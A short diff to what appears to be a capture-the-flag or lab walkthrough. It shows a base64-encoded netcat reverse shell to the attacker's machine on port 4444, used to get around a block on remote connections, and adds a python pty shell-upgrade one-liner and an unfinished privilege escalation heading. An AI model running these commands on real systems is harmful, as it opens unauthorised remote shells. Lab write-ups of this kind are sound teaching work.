@@ -66,3 +66,9 @@ Remove connections are forbidden
 In terminal:
 `echo nc -e /bin/bash machine IP (from above) 4444 | base64`
 - Copy output and run with `output | base64 -d | bash`
+
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+
+## Priviledge Escalation
+
+To be continued...
